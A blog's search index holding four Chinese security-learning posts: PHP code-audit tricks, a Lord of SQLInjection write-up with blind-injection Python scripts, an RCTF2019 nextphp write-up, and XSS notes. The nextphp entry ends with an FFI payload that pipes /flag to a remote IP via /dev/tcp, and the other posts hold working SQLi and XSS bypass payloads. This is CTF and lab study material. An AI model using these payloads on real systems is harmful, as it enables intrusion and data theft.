<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[红日代码审计项目学习(Day8)]]></title>
    <url>%2F2019%2F07%2F26%2F%E7%BA%A2%E6%97%A5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0-Day8%2F</url>
    <content type="text"><![CDATA[Candle12345678910111213header("Content-Type: text/plain"); function complexStrtolower($regex, $value) &#123; return preg_replace( '/(' . $regex . ')/ei', 'strtolower("\\1")', $value );&#125; foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . "\n";&#125; 这里preg_replace使用了/e修饰符，会执行替换后的字符串 Curly SyntaxPHP的特殊语法，花括号间的代码能执行，并将结果替换回去 123$a = 'huha'; echo $&#123;"\x61"&#125;;intval("&#123;$&#123;phpinfo()&#125;&#125;"); payload1?1=system('dir');//&amp;\S*=&#123;$&#123;eval($_GET[1])&#125;&#125; CTF练手1234567891011121314151617&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code=$_GET['code']; if(strlen($code)&gt;40)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;highlight_file(__FILE);// $hint = "php function getFlag() to get flag"; 这道题可以参考Phithon师傅的文章 fuzz脚本123456789101112131415161718192021222324def test(number): list = &#123;&#125; for x in [x for x in range(33,48)] + [x for x in range(58,65)]+ [x for x in range(91,97)]+ [x for x in range(123,127)]: list[hex(x)] = chr(x^number) return list def search(abc): list = [x for x in range(33,48)] + [x for x in range(58,65)]+ [x for x in range(91,97)]+ [x for x in range(123,127)] for number in list: list = test(number) for key in list.keys(): if abc == list[key]: a = chr(int(key,16)) b = chr(number) return a,b a = ""b = ""payload = input("search: ")for x in payload: a += search(x)[0] b += search(x)[1]print(a)print(b) payload1?_=getFlag&amp;code=$_="~``|"^"!'%(";$__=$$_;$__[_](); 第二道题目过滤了下划线，可以利用中文字符代替下划线 1?哈=getFlag&amp;code=$哈="~``|"^"!'%(";$哈=$$哈;$哈[哈](); 扩展阅读无字母数字webshell之提高篇CTF题目思考–极限利用]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lord of SQLInjection Write Up(to be continue)]]></title>
    <url>%2F2019%2F07%2F26%2FLord-of-SQLInjection-Write-Up-%E9%83%A8%E5%88%86%2F</url>
    <content type="text"><![CDATA[orc12345678910111213141516&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); $query = "select id from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) echo "&lt;h2&gt;Hello admin&lt;/h2&gt;"; $_GET[pw] = addslashes($_GET[pw]); $query = "select pw from prob_orc where id='admin' and pw='&#123;$_GET[pw]&#125;'"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve("orc"); highlight_file(__FILE__); ?&gt; 后端对表名进行限制，注入代码中不能包含表名，但是可以利用where语句进行免表名查询 payload1?pw=1'or id='admin' and ascii(binary(substr((pw),3,1)))&gt;53%23 其中的pw字段会查询前面from的prob_orc数据表id = ‘admin’是为了取id为admin的pw字段 盲注脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/usr/bin/env python# -*- coding: utf-8 -*-'''desc:author: huha'''# 盲注脚本import requestsimport stringdef doinject(url, sqli_input, i, num): payload = "and ascii(binary(substr((%s),%d,1)))&gt;%d" % (sqli_input, i+1, num) payload += '%23' url = url print(url+payload) headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Cookie':'PHPSESSID=9fpfms0cnvii35netn60uskb03' &#125; r = requests.get(url+payload, headers=headers, timeout=20) #在这里定义对于不同响应的处理 # print(r.text) if "Hello admin" in r.text: return True else: return False def getvalue(url, len, sqli_input): # 二分法 # list = '0123456789ABCDEF' flag = '' # step = 2 for i in range(len): s = 33 t = 126 while (s &lt; t): m = (s + t) / 2 result = doinject(url, sqli_input, i, m) if result: s = m + 1 else: t = m if (t - s &lt;= 1): if (doinject(url, sqli_input, i, s)): m = t break else: m = s break flag += chr(int(m)) print(flag) # print(m) # print(hex(m)[2:]) # flag += '&#123;0:02x&#125;'.format(int(m)) # flag += chr(int(m)) if __name__ == '__main__': # 目标url base_url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php" query = "?pw=1'or id='admin' " # query="" url = base_url+query # 在这里定义你的注入语句 sqli_input = "pw" getvalue(url, 30, sqli_input) orge123456789101112131415161718&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); $query = "select id from prob_orge where id='guest' and pw='&#123;$_GET[pw]&#125;'"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) echo "&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"; $_GET[pw] = addslashes($_GET[pw]); $query = "select pw from prob_orge where id='admin' and pw='&#123;$_GET[pw]&#125;'"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve("orge"); highlight_file(__FILE__); ?&gt; 与ORC类似，or被过滤用||代替 ，但是需要的是admin的密码，而不是guest的 payload1'|| id='admin' %26%26 ascii(mid((select pw from (select 1)a),1,1))&gt;79%23 其中字符&amp;用url编码为%26，否则用hackbar测试或者python构造盲注脚本时被认为是参数分隔符虽然过滤表名，但是在where语句中会自动识别表名 1234# 进行pw字段查询select pw from (select 1)a)select pw 盲注脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python# -*- coding: utf-8 -*-'''desc:author: huha'''# 盲注脚本import requestsimport stringdef doinject(url, sqli_input, i, num): payload = "'|| id='admin' " + '%26%26' + " ascii(mid((select %s from (select 1)a),%d,1))&gt;%d" % (sqli_input, i+1, num) + '%23' url = url print(url+payload) headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Cookie':'PHPSESSID=mk1fatv9vr1fj4812fmopbmmr6' &#125; r = requests.get(url+payload, headers=headers, timeout=20) #在这里定义对于不同响应的处理 # print(r.text) if "Hello admin" in r.text: return True else: return False def getvalue(url, len, sqli_input): # 二分法 # list = '0123456789ABCDEF' flag = '' # step = 2 for i in range(len): s = 33 t = 126 while (s &lt; t): m = (s + t) / 2 result = doinject(url, sqli_input, i, m) if result: s = m + 1 else: t = m if (t - s &lt;= 1): if (doinject(url, sqli_input, i, s)): m = t break else: m = s break flag += chr(int(m)) print(flag) # print(m) # print(hex(m)[2:]) # flag += '&#123;0:02x&#125;'.format(int(m)) # flag += chr(int(m)) if __name__ == '__main__': # 目标url base_url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php" query = "?pw=" # query="" url = base_url+query # 在这里定义你的注入语句 sqli_input = "pw" getvalue(url, 30, sqli_input) skeleton1234567891011&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); $query = "select id from prob_skeleton where id='guest' and pw='&#123;$_GET[pw]&#125;' and 1=0"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id'] == 'admin') solve("skeleton"); highlight_file(__FILE__); ?&gt; and的优先级高于or运算符，利用这点构造payload进行绕过 payload1https://los.rubiya.kr/chall/skeleton_a857a5ab24431d6fb4a00577dac0f39c.php?pw=' or id = 'admin' or '1 golem123456789101112131415161718&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); $query = "select id from prob_golem where id='guest' and pw='&#123;$_GET[pw]&#125;'"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) echo "&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"; $_GET[pw] = addslashes($_GET[pw]); $query = "select pw from prob_golem where id='admin' and pw='&#123;$_GET[pw]&#125;'"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve("golem"); highlight_file(__FILE__); ?&gt; 等于号被过滤，利用like代替 payload1https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw='|| id like 'admin' %26%26 ascii(mid((select pw from (select 1)a),1,1))&lt;79%23 类似前面构造盲注脚本，不赘述。 darkknight123456789101112131415161718&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); $query = "select id from prob_darkknight where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) echo "&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"; $_GET[pw] = addslashes($_GET[pw]); $query = "select pw from prob_darkknight where id='admin' and pw='&#123;$_GET[pw]&#125;'"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve("darkknight"); highlight_file(__FILE__); ?&gt; 等号用like代替,单引号被过滤，字符用十六进制表示 payload1?pw=1&amp;no=1 or id like 0x61646D696E and binary(mid((select pw),1,1))&lt;0x61 盲注脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import requestsimport stringdef doinject(url, sqli_input, i, num): # 在这里可以自定义你的payload payload = "binary(mid((%s),%d,1))&gt;%s" % (sqli_input, i+1, hex(int(num))) url = url print(url+payload) headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Cookie':'PHPSESSID=tqrsls0kklon0lgkaor0omjv1s' &#125; #在这里定义对于不同响应的处理 # print(r.text) if "Hello admin" in r.text: return True else: return False def getvalue(url, len, sqli_input): flag = '' for i in range(len): s = 33 t = 126 while (s &lt; t): m = (s + t) / 2 result = doinject(url, sqli_input, i, m) if result: s = m + 1 else: t = m if (t - s &lt;= 1): if (doinject(url, sqli_input, i, s)): m = t break else: m = s break flag += chr(int(m)) print(flag) if __name__ == '__main__': # 目标url base_url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php" query = "?pw=1&amp;no=1 or id like 0x61646D696E and " url = base_url+query # print(url) # 在这里定义你的注入语句 sqli_input = "pw" getvalue(url, 30, sqli_input) bugbear12345678910111213141516171819&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); $query = "select id from prob_bugbear where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result['id']) echo "&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"; $_GET[pw] = addslashes($_GET[pw]); $query = "select pw from prob_bugbear where id='admin' and pw='&#123;$_GET[pw]&#125;'"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve("bugbear"); highlight_file(__FILE__); ?&gt; 这个进一步过滤，过滤了0x|空格|like|or|and，见招拆招like用in代替16进制表示字符改为char()空格用注释符绕过or|and用||和&amp;&amp;代替 payload1?pw=1&amp;no=1||id/**/in(select/**/CHAR(97,100,109,105,110))%26%26binary(mid((pw),1,1))&lt;CHAR(97) 类似上题构造盲注脚本，不赘述 giant123456789101112&lt;?php include "./config.php"; login_chk(); $db = dbconnect(); if(strlen($_GET[shit])&gt;1) exit("No Hack ~_~"); if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); $query = "select 1234 from&#123;$_GET[shit]&#125;prob_giant where 1"; echo "&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"; $result = @mysqli_fetch_array(mysqli_query($db,$query)); if($result[1234]) solve("giant"); highlight_file(__FILE__); ?&gt; 目标很明确，找到可以当作空格又不被过滤的字符本地生成字典 12for x in range(0, 256): print('%&#123;0:02x&#125;'.format(x)) 利用burp进行fuzz%0b跟%0c可以被当作空格]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF2019 nextphp writeup]]></title>
    <url>%2F2019%2F07%2F24%2FRCTF2019%20nextphp%20writeup%2F</url>
    <content type="text"><![CDATA[问题PHP is the best language! http://nextphp.2019.rctf.rois.io 解题php代码没有对eval函数中的参数进行任何过滤，猜测存在任意命令执行漏洞 1http://nextphp.2019.rctf.rois.io/?a=echo phpinfo(); 查看php配置信息，发现过滤了大多数系统函数但没有过滤scandir() 1http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir('/var/www/html')); 爆出网站根目录文件 利用file_get_contents()查看preload.php源码 1view-source:http://nextphp.2019.rctf.rois.io/?a=echo%20file_get_contents(%27preload.php%27); preload.php源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \Exception('No implemented'); &#125; public function __construct () &#123; throw new \Exception('No implemented'); &#125;&#125; PHP7.4新特性：新的自定义对象序列化机制 关于serialize和unserialize 观察代码，发现对象反序列时会执行run()方法 123private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']);&#125; 可以结合__get魔法函数，获取对象data数组中的元素值 123public function __get ($key) &#123; return $this-&gt;data[$key];&#125; 构造自己的序列化对象并调用反序列化方法，include引入preload.php页面，注入代码，查看ret参数 1http://nextphp.2019.rctf.rois.io/?a=include(%27preload.php%27);var_dump(unserialize(%27C:1:%22A%22:150:&#123;a:3:&#123;s:3:%22ret%22;N;s:4:%22func%22;s:7:%22print_r%22;s:3:%22arg%22;a:3:&#123;s:1:%22a%22;s:5:%22apple%22;s:1:%22b%22;s:6:%22banana%22;s:1:%22c%22;a:3:&#123;i:0;s:1:%22x%22;i:1;s:1:%22y%22;i:2;s:1:%22z%22;&#125;&#125;&#125;&#125;%27)-%3E__get(%27ret%27)); 成功执行print_r()函数打印出数组 接下来就是想办法使用系统函数，利用将func修改为system或者exec之类的，但转念一想，能执行系统命令的危险函数不是都被过滤了吗？到这里卡住了。 解决方法ROIS战队Writeup preload.php这个文件名也是hint，google搜索preload site:php.net发现php中的预加载机制配合Writeup中提到了FFI扩展可以实现任意代码执行。对于PHP，FFI开辟了一种在纯PHP中编写PHP扩展和绑定到C库的方法。 php.ini配置使用preload预加载与FFI扩展 12ffi.enable = preload opcache.preload = preload.php 注： 在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件 构造序列化对象 1234567891011121314... protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'FFI::cdef', # 使用C库函数 'arg' =&gt; 'int system(const char *command);' ];... $obj = new A; $ser = serialize($obj); echo $ser; # 输出序列化对象C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125; Payload 1http://nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125;')-&gt;__get('ret')-&gt;system('bash -c "cat /flag &gt; /dev/tcp/167.99.105.52/8080"'); Get flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS入门总结]]></title>
    <url>%2F2019%2F07%2F24%2Fxss%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[XSS漏洞基础XSS入门介绍https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 解析器如何工作For example, a tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser. XSS解析器就是浏览器 HTML entities（HTML 实体）HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）https://www.w3schools.com/html/html_entities.asp 浏览器如何解码（Freebuf博主）https://www.freebuf.com/articles/web/10121.html XSS漏洞复现http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS &lt; script &gt;标签内的标准弹框语句，不经过数据库存取 alert(1) alert(“xss”) alert(/xss/) alert(‘xss’) 经过数据库存取 alert(1) alert(“xss”) alert(/xss/) alert(\ ‘xss\ ‘)（mysql插入数据时默认用单引号包围，再包括单引号出现语法错误） DOM复现的绕过语句：‘&gt;&lt; img src=# onerror=”alert(‘XSS’)”&gt;&lt;’‘ onclick=alert(/xss/) //‘ onclick=’alert(/xss/)’ # 单引号双引号都没有关系 注：“ &gt;testLink “前面的有个单引号，如果没有明显的引号与前面的属性分开，会与前面的属性结合后再自动添加引号（如果是事件类型），所以可以使用“ 空格// ”分隔，或者直接显示用引号包括事件，如上第二种解决方法。 DVWA安装：https://github.com/ethicalhack3r/DVWA DVWA靶场游玩攻略（XSS）：https://www.freebuf.com/articles/web/123779.htmlhttps://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/ DVWA XSS Reflected• 过滤了“&lt; script &gt;”标签，使用大小写，双写， 添加src属性绕过 • 若采用正则匹配过滤“&lt; script &gt;”，之前方法都行不通，考虑使用其他标签：​ iframe​ input img​ body​ 添加src属性，利用鼠标事件（通用）：​ &lt; IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;​ 利用error事件，适用img​ &lt; IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt; • htmlspecialchars( $_GET[ ‘name’ ] );无解 DVWA XSS Store• mysqli_real_escape_string()转移字符串（SQL中的特殊字符）：一次转义对SQL命令并无太大影响，数据库会存储未转义前的字符 • stripslashes()去除反斜杠 • name字段的限制可以通过burp抓包修改 • addslashes( $ message ),mysqli_real_escape_string（$ message）,htmlspecialchars( $ message )，多次转义，数据库中的特殊符号带上反斜杠，并且$message中的HTML保留字符被转换为HTML实体，impossible级别 DVWA DOM XSS• 基于client的XSS漏洞• the hash symbol(#)不会被服务端接收到（#后面的部分称为fragment） XSS平台搭建 教程：https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1https://blog.csdn.net/u011781521/article/details/53895363 window10配置静态文件https://blog.csdn.net/cz_devil/article/details/16826647https://blog.csdn.net/qq_16241043/article/details/54176442 查看Apache启动失败的错误信息：打开cmd，输入：D:\phpStudy\Apache\binhttpd.exe -t 回车，即显示错误信息 XSS漏洞挖掘识别URL上的输入点可控点：&lt; path&gt;&lt; query&gt;&lt; fragement&gt;• web2.0的URL与传统形式上的差异：更强调明确含义（web2.0url名称与传统URL的映射）• 需要强大的爬虫进行识别• fragment可能出现在服务端解析中 进行XSS测试时，可能的输出点 HTML标签之间 直接输入js代码 闭合标签（其他标签无法执行HTML代码） 注：divprecode这三个标签可以解析HTML代码，不可以解析的标签实际上是进行了htmencode编码 HTML标签之内（属性） 利用事件（效果比较差） 闭合属性，闭合标签（成功率较低） 特殊属性src/href/actionhref执行javascript伪协议，过滤//，考虑js字符串的加减乘除onerror(适用img)data伪协议 成为js代码 闭合script标签 绕过变量引用 HTML与js的自解码与编码函数• HTML标签内（&lt;&gt;&amp;） entity_name：&amp;#xH &amp;#D（可以去除分号） entity_number:&lt; 使用htmlspecialchars（）主动编码 • JS上下文内 unicode格式：\uH（中文要使用） 普通的八进制：\65\65 普通16进制：\xH 反斜杠：&#39;,&quot;,&lt;,&gt; urlncode编码• firefox 和 chorm都会默认url编码 ‘“&lt;&gt;这四种字符，#号后面单引号不会编码，但其他字符还是会进行编码• PHP中$_SERVER[QUERY_STRING]获取urlencode后的内容 URL编码——利用JS统一编码http://www.ruanyifeng.com/blog/2010/02/url_encoding.html 补充：正常unicode格式：\u5487 escape（）编码后：%u5487escapeURI（）编码后：utf-8方式（三个字节）%E7%A2%94（同样百分号开头）escapeURIComponent（）编码后：类似第二种，所有字符编码 注： 编码解码函数参数都可以接收unicode字符， 如果是ASCII范围内，结果返回可打印的字符， 如果超出这个范围，编码正常（可能是unicode模式，可能是utf-8形式），解码都是返回相应的字符 思考： 其次，escape()不对”+”编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服 务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。 XSS game http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html Hack mehttps://hack.me/ XSStrikehttps://github.com/s0md3v/XSStrike 基于DOM的XSS模糊测试论文（基础打好后再看）https://www.hindawi.com/journals/jcnc/2018/8159548/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>漏洞学习</tag>
      </tags>
  </entry>
</search>
